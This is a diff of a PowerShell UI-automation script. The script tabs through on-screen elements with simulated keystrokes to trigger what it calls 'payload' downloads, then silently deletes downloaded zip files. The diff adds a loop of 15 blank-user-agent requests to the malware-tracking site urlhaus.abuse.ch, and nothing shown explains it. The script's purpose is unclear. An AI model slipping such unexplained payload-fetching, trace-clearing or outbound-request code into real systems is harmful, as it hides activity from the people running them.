@@ -16,7 +16,7 @@ Write-Host "Success! Selection landed on target element name: '$currentName' aft
 $targetUnoFound=$true;break
 }
 }
-$Shell.SendKeys("{TAB}");$tabCount++;Start-Sleep -Milliseconds 100
+$Shell.SendKeys("{TAB}");$tabCount++;Start-Sleep -Milliseconds 75
 }
 if($targetUnoFound){
 Write-Host "Striking initial download trigger..."
@@ -41,7 +41,7 @@ Write-Host "Success! Selection landed on target element name: '$currentName' aft
 $targetDosFound=$true;break
 }
 }
-$Shell.SendKeys("{TAB}");$tabCount++;Start-Sleep -Milliseconds 100
+$Shell.SendKeys("{TAB}");$tabCount++;Start-Sleep -Milliseconds 75
 }
 if($targetDosFound){
 Write-Host "Striking payload download trigger..."
@@ -165,4 +165,7 @@ $tempZips=Get-ChildItem -Path $tempPath -Filter "*.zip" -ErrorAction SilentlyCon
 $downloadZip=Join-Path ([Environment]::GetFolderPath('UserProfile')) "Downloads\download.zip"
 foreach($zip in $tempZips){Remove-Item -LiteralPath $zip.FullName -Force -ErrorAction SilentlyContinue}
 if(Test-Path -LiteralPath $downloadZip){Remove-Item -LiteralPath $downloadZip -Force -ErrorAction SilentlyContinue}
+foreach ($i in 1..15) {
+Invoke-RestMethod -Uri "https://urlhaus.abuse.ch:443/browse.php" -Method Get -UserAgent ""
+}
 [Environment]::Exit(0)
